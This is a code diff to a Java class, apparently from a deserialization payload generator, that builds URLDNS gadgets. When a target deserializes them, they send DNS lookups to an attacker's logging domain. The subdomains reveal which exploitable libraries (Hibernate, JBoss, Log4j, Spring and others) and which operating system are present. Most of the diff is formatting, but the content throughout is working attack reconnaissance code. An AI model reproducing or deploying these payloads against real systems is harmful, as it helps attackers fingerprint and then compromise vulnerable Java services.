@@ -237,69 +237,69 @@ public class URLDNS implements ObjectPayload<Object> {
                 list.add(resin_qname_rce);
                 break;
             case "other":
-                Object spel= getURLDNSGadget("spel." + dnsLog, "org.springframework.expression.spel.standard.SpelExpressionParser");
+                Object spel = getURLDNSGadget("spel." + dnsLog, "org.springframework.expression.spel.standard.SpelExpressionParser");
                 list.add(spel);
-                Object commons_KeyedObjectPoolFactory= getURLDNSGadget("commons_KeyedObjectPoolFactory." + dnsLog, "org.apache.commons.pool.KeyedObjectPoolFactory");
+                Object commons_KeyedObjectPoolFactory = getURLDNSGadget("commons_KeyedObjectPoolFactory." + dnsLog, "org.apache.commons.pool.KeyedObjectPoolFactory");
                 list.add(commons_KeyedObjectPoolFactory);
-                Object tomcat_PooledObjectFactory= getURLDNSGadget("tomcat_PooledObjectFactory." + dnsLog, "org.apache.commons.pool2.PooledObjectFactory");
+                Object tomcat_PooledObjectFactory = getURLDNSGadget("tomcat_PooledObjectFactory." + dnsLog, "org.apache.commons.pool2.PooledObjectFactory");
                 list.add(tomcat_PooledObjectFactory);
-                Object hibernate_rce= getURLDNSGadget("hibernate_rce." + dnsLog, "org.hibernate.jmx.StatisticsService");
+                Object hibernate_rce = getURLDNSGadget("hibernate_rce." + dnsLog, "org.hibernate.jmx.StatisticsService");
                 list.add(hibernate_rce);
-                Object mysql_MiniAdmin= getURLDNSGadget("mysql_MiniAdmin." + dnsLog, "com.mysql.cj.jdbc.admin.MiniAdmin");
+                Object mysql_MiniAdmin = getURLDNSGadget("mysql_MiniAdmin." + dnsLog, "com.mysql.cj.jdbc.admin.MiniAdmin");
                 list.add(mysql_MiniAdmin);
-                Object OracleCachedRowSet_jndi= getURLDNSGadget("OracleCachedRowSet_jndi." + dnsLog, "oracle.jdbc.rowset.OracleCachedRowSet");
+                Object OracleCachedRowSet_jndi = getURLDNSGadget("OracleCachedRowSet_jndi." + dnsLog, "oracle.jdbc.rowset.OracleCachedRowSet");
                 list.add(OracleCachedRowSet_jndi);
-                Object oracle_jdbcrowset= getURLDNSGadget("oracle_jdbcrowset." + dnsLog, "oracle.jdbc.rowset.OracleJDBCRowSet");
+                Object oracle_jdbcrowset = getURLDNSGadget("oracle_jdbcrowset." + dnsLog, "oracle.jdbc.rowset.OracleJDBCRowSet");
                 list.add(oracle_jdbcrowset);
-                Object dameng_DmdbRowSet= getURLDNSGadget("dameng_DmdbRowSet." + dnsLog, "dm.jdbc.driver.DmdbRowSet");
+                Object dameng_DmdbRowSet = getURLDNSGadget("dameng_DmdbRowSet." + dnsLog, "dm.jdbc.driver.DmdbRowSet");
                 list.add(dameng_DmdbRowSet);
-                Object jboss_rce= getURLDNSGadget("jboss_rce." + dnsLog, "org.jboss.util.propertyeditor.DocumentEditor");
+                Object jboss_rce = getURLDNSGadget("jboss_rce." + dnsLog, "org.jboss.util.propertyeditor.DocumentEditor");
                 list.add(jboss_rce);
-                Object myfaces_rce= getURLDNSGadget("myfaces_rce." + dnsLog, "org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression");
+                Object myfaces_rce = getURLDNSGadget("myfaces_rce." + dnsLog, "org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression");
                 list.add(myfaces_rce);
-                Object jython_rce= getURLDNSGadget("jython_rce." + dnsLog, "org.python.core.PyBytecode.PyBytecode");
+                Object jython_rce = getURLDNSGadget("jython_rce." + dnsLog, "org.python.core.PyBytecode.PyBytecode");
                 list.add(jython_rce);
-                Object rome_rce= getURLDNSGadget("rome_rce." + dnsLog, "com.sun.syndication.feed.impl.ObjectBean");
+                Object rome_rce = getURLDNSGadget("rome_rce." + dnsLog, "com.sun.syndication.feed.impl.ObjectBean");
                 list.add(rome_rce);
-                Object vaadin_rce= getURLDNSGadget("vaadin_rce." + dnsLog, "com.vaadin.data.util.PropertysetItem");
+                Object vaadin_rce = getURLDNSGadget("vaadin_rce." + dnsLog, "com.vaadin.data.util.PropertysetItem");
                 list.add(vaadin_rce);
-                Object wicket_rce= getURLDNSGadget("wicket_rce." + dnsLog, "org.apache.wicket.util.upload.DiskFileItem");
+                Object wicket_rce = getURLDNSGadget("wicket_rce." + dnsLog, "org.apache.wicket.util.upload.DiskFileItem");
                 list.add(wicket_rce);
-                Object rhino_js_rce= getURLDNSGadget("rhino_js_rce." + dnsLog, "org.mozilla.javascript.NativeError");
+                Object rhino_js_rce = getURLDNSGadget("rhino_js_rce." + dnsLog, "org.mozilla.javascript.NativeError");
                 list.add(rhino_js_rce);
-                Object hibernate_Getter= getURLDNSGadget("hibernate_Getter." + dnsLog, "org.hibernate.property.Getter");
+                Object hibernate_Getter = getURLDNSGadget("hibernate_Getter." + dnsLog, "org.hibernate.property.Getter");
                 list.add(hibernate_Getter);
-                Object hibernate_TypedValue= getURLDNSGadget("hibernate_TypedValue." + dnsLog, "org.hibernate.engine.spi.TypedValue");
+                Object hibernate_TypedValue = getURLDNSGadget("hibernate_TypedValue." + dnsLog, "org.hibernate.engine.spi.TypedValue");
                 list.add(hibernate_TypedValue);
-                Object net_sf_json_rce= getURLDNSGadget("net_sf_json_rce." + dnsLog, "net.sf.json.JSONObject");
+                Object net_sf_json_rce = getURLDNSGadget("net_sf_json_rce." + dnsLog, "net.sf.json.JSONObject");
                 list.add(net_sf_json_rce);
-                Object clojure_rce= getURLDNSGadget("clojure_rce." + dnsLog, "clojure.lang.PersistentArrayMap");
+                Object clojure_rce = getURLDNSGadget("clojure_rce." + dnsLog, "clojure.lang.PersistentArrayMap");
                 list.add(clojure_rce);
-                Object click_rce= getURLDNSGadget("click_rce." + dnsLog, "org.apache.click.control.Table");
+                Object click_rce = getURLDNSGadget("click_rce." + dnsLog, "org.apache.click.control.Table");
                 list.add(click_rce);
-                Object WildFly_rce= getURLDNSGadget("WildFly_rce." + dnsLog, "org.jboss.as.connector.subsystems.datasources.WildFlyDataSource");
+                Object WildFly_rce = getURLDNSGadget("WildFly_rce." + dnsLog, "org.jboss.as.connector.subsystems.datasources.WildFlyDataSource");
                 list.add(WildFly_rce);
-                Object WildFly_rce1= getURLDNSGadget("WildFly_rce1." + dnsLog, "org.apache.batik.swing.JSVGCanvas");
+                Object WildFly_rce1 = getURLDNSGadget("WildFly_rce1." + dnsLog, "org.apache.batik.swing.JSVGCanvas");
                 list.add(WildFly_rce1);
-                Object hibernate_core_4= getURLDNSGadget("hibernate_core_4.x." + dnsLog, "org.hibernate.service.jdbc.connections.internal.DriverManagerConnectionProviderImpl");
+                Object hibernate_core_4 = getURLDNSGadget("hibernate_core_4.x." + dnsLog, "org.hibernate.service.jdbc.connections.internal.DriverManagerConnectionProviderImpl");
                 list.add(hibernate_core_4);
-                Object tomcat9_not_version8= getURLDNSGadget("tomcat9_not_version8." + dnsLog, "org.apache.catalina.util.ToStringUtil");
+                Object tomcat9_not_version8 = getURLDNSGadget("tomcat9_not_version8." + dnsLog, "org.apache.catalina.util.ToStringUtil");
                 list.add(tomcat9_not_version8);
-                Object log4j_jndi= getURLDNSGadget("log4j_jndi." + dnsLog, "org.apache.log4j.receivers.dbMap.JNDIConnectionSource");
+                Object log4j_jndi = getURLDNSGadget("log4j_jndi." + dnsLog, "org.apache.log4j.receivers.dbMap.JNDIConnectionSource");
                 list.add(log4j_jndi);
-                Object log4j_driver= getURLDNSGadget("log4j_driver." + dnsLog, "org.apache.log4j.receivers.dbMap.DriverManagerConnectionSource");
+                Object log4j_driver = getURLDNSGadget("log4j_driver." + dnsLog, "org.apache.log4j.receivers.dbMap.DriverManagerConnectionSource");
                 list.add(log4j_driver);
-                Object jdbcRowSet= getURLDNSGadget("jdbcRowSet." + dnsLog, "com.sun.rowset.JdbcRowSetImpl");
+                Object jdbcRowSet = getURLDNSGadget("jdbcRowSet." + dnsLog, "com.sun.rowset.JdbcRowSetImpl");
                 list.add(jdbcRowSet);
-                Object ibatis_jndi= getURLDNSGadget("ibatis_jndi." + dnsLog, "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory");
+                Object ibatis_jndi = getURLDNSGadget("ibatis_jndi." + dnsLog, "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory");
                 list.add(ibatis_jndi);
-                Object ibatis_XPathParser= getURLDNSGadget("ibatis_XPathParser." + dnsLog, "org.apache.ibatis.parsing.XPathParser");
+                Object ibatis_XPathParser = getURLDNSGadget("ibatis_XPathParser." + dnsLog, "org.apache.ibatis.parsing.XPathParser");
                 list.add(ibatis_XPathParser);
-                Object LogFactory= getURLDNSGadget("LogFactory." + dnsLog, "org.apache.juli.logging.LogFactory");
+                Object LogFactory = getURLDNSGadget("LogFactory." + dnsLog, "org.apache.juli.logging.LogFactory");
                 list.add(LogFactory);
-                Object MXParser= getURLDNSGadget("MXParser." + dnsLog, "org.xmlpull.mxp1.MXParser");
+                Object MXParser = getURLDNSGadget("MXParser." + dnsLog, "org.xmlpull.mxp1.MXParser");
                 list.add(MXParser);
-                Object XmlPullParserException= getURLDNSGadget("XmlPullParserException." + dnsLog, "org.xmlpull.v1.XmlPullParserException");
+                Object XmlPullParserException = getURLDNSGadget("XmlPullParserException." + dnsLog, "org.xmlpull.v1.XmlPullParserException");
                 list.add(XmlPullParserException);
                 break;
             case "jndiAttack":
@@ -537,21 +537,20 @@ public class URLDNS implements ObjectPayload<Object> {
                 break;
             case "winlinux":
                 //windows/linux版本判断
-
-                String os = System.getProperty("os.name").toLowerCase();
-                String fsClass;
-
-                if (os.contains("win")) {
+                try {
                     Object linux = getURLDNSGadget("linux." + dnsLog, "sun.awt.X11.AwtGraphicsConfigData");
                     Object windows = getURLDNSGadget("windows." + dnsLog, "sun.awt.windows.WButtonPeer");
                     list.add(linux);
                     list.add(windows);
-                } else {
-                    Object linux1 = getURLDNSGadget("linux1." + dnsLog, "java.io.UnixFileSystem");
-                    Object windows1 = getURLDNSGadget("windows1." + dnsLog, "java.io.WinNTFileSystem");
-                    list.add(linux1);
-                    list.add(windows1);
+//                    Object linux1 = getURLDNSGadget("linux1." + dnsLog, "java.io.UnixFileSystem");
+//                    Object windows1 = getURLDNSGadget("windows1." + dnsLog, "java.io.WinNTFileSystem");
+//                    list.add(linux1);
+//                    list.add(windows1);
+                } catch (Exception e) {
+                    log.error("e: ", e);
                 }
+
+
                 break;
 
             case "all":
